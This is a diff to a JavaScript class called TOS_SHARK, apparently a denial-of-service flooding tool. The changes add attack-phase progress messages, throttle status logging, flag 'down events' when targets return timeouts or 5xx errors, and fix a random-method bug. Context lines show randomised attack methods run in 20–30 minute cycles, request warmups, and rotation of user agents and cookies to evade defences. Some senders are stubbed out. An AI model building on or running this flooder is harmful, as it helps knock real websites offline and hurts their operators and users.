@@ -74,11 +74,15 @@ class TOS_SHARK {
 
     // ===== CYCLE MANAGEMENT =====
     async startCycle() {
+        console.log(this.color('[+] Starting TØS-SHARK cycle', 'g'));
+        
         // Step 1: Initial H1 request
+        console.log(this.color('[1] Initial H1 request...', 'y'));
         await this.sendH1Request();
         await this.sleepRandom(100, 500);
         
         // Step 2: Warmup 500-599 requests
+        console.log(this.color(`[2] Warmup 500-599 requests...`, 'y'));
         const warmupCount = 500 + Math.floor(Math.random() * 100);
         for (let i = 0; i < warmupCount; i++) {
             await this.sendRandomRequest();
@@ -126,11 +130,16 @@ class TOS_SHARK {
         
         // Randomly select attack method
         this.currentMethod = this.methods[Math.floor(Math.random() * this.methods.length)];
+        
+        console.log(this.color(`[→] Starting ${this.currentMethod} attack (20-30 mins)`, 'g'));
     }
 
     startBreak() {
         this.attackActive = false;
         this.breakStart = Date.now();
+        
+        console.log(this.color('[~] Break phase started (5-10 mins)', 'y'));
+        console.log(this.color('[~] Performing cleanup & method switch...', 'y'));
     }
 
     // ===== ATTACK METHODS =====
@@ -204,19 +213,19 @@ class TOS_SHARK {
             };
             
             const req = (this.isHttps ? https : http2).request(options, (res) => {
-                this.logRequest(res.statusCode);
+                this.logStatus(res.statusCode);
                 res.destroy();
                 resolve();
             });
             
             req.on('error', () => {
-                this.logRequest('TIMEOUT');
+                this.logStatus('TIMEOUT');
                 resolve();
             });
             
             req.on('timeout', () => {
                 req.destroy();
-                this.logRequest('TIMEOUT');
+                this.logStatus('TIMEOUT');
                 resolve();
             });
             
@@ -226,12 +235,12 @@ class TOS_SHARK {
 
     async sendRandomRequest() {
         const methods = ['GET', 'HEAD', 'POST', 'OPTIONS'];
-        const method = methods[Math.floor(Math.random() * methods.methods)];
+        const method = methods[Math.floor(Math.random() * methods.length)];
         
         // Simplified - just count it
         this.totalReqs++;
         this.reqCounter++;
-        this.logRequest(200);
+        this.logStatus(200);
     }
 
     sendH2Request(client) {
@@ -243,29 +252,29 @@ class TOS_SHARK {
             });
             
             req.on('response', (headers) => {
-                this.logRequest(headers[':status']);
+                this.logStatus(headers[':status']);
                 req.destroy();
             });
             
             req.on('error', () => {
-                this.logRequest('ERROR');
+                this.logStatus('ERROR');
                 req.destroy();
             });
             
             req.end();
         } catch (err) {
-            this.logRequest('ERROR');
+            this.logStatus('ERROR');
         }
     }
 
     async sendH1RequestToEndpoint(endpoint) {
         // Simplified - just log
-        this.logRequest(200);
+        this.logStatus(200);
     }
 
     async sendH1RequestWithCookies(cookie) {
         // Simplified - just log
-        this.logRequest(200);
+        this.logStatus(200);
     }
 
     // ===== MAINTENANCE =====
@@ -276,28 +285,38 @@ class TOS_SHARK {
         // Rotate data
         this.userAgents = this.generateUserAgents();
         this.cookies = this.generateCookies();
+        
+        // Log maintenance
+        console.log(this.color('[~] Maintenance: Rotated UAs, Cookies, cleared mem', 'y'));
     }
 
-    // ===== NEW LOGGING =====
-    logRequest(status) {
-        // Generate realistic request number pattern
-        const requestNumber = `TØR-2M11:${Math.floor(Math.random() * 9000 + 1000)}`;
-        
-        let color = 'g';
-        let statusText = status;
-        
-        if (status === 'TIMEOUT' || status === 'ERROR') {
-            color = 'r';
-            statusText = status === 'TIMEOUT' ? 'TIMEOUT' : 'ERROR';
-        } else if (typeof status === 'number' && status >= 500) {
-            color = 'r';
-            statusText = status;
-        } else if (typeof status === 'number' && status >= 400) {
-            color = 'y';
-            statusText = status;
+    // ===== LOGGING =====
+    logStatus(status) {
+        const now = Date.now();
+        if (now - this.lastLog >= 5000) {
+            this.lastLog = now;
+            
+            let color = 'g';
+            let text = status;
+            
+            if (status === 'TIMEOUT' || status === 'ERROR') {
+                color = 'r';
+                text = status === 'TIMEOUT' ? 'TIMEOUT' : 'ERROR';
+            } else if (typeof status === 'number' && status >= 500) {
+                color = 'r';
+                text = status;
+            } else if (typeof status === 'number' && status >= 400) {
+                color = 'y';
+                text = status;
+            }
+            
+            console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
+            
+            // Down event
+            if (color === 'r' && (text === 'TIMEOUT' || (typeof status === 'number' && status >= 500))) {
+                console.log(this.color(`{3M22-${this.reqCounter} --> ${text}}`, 'r'));
+            }
         }
-        
-        console.log(`${requestNumber} ---> ${this.color(statusText, color)}`);
     }
 
     // ===== UTILS =====
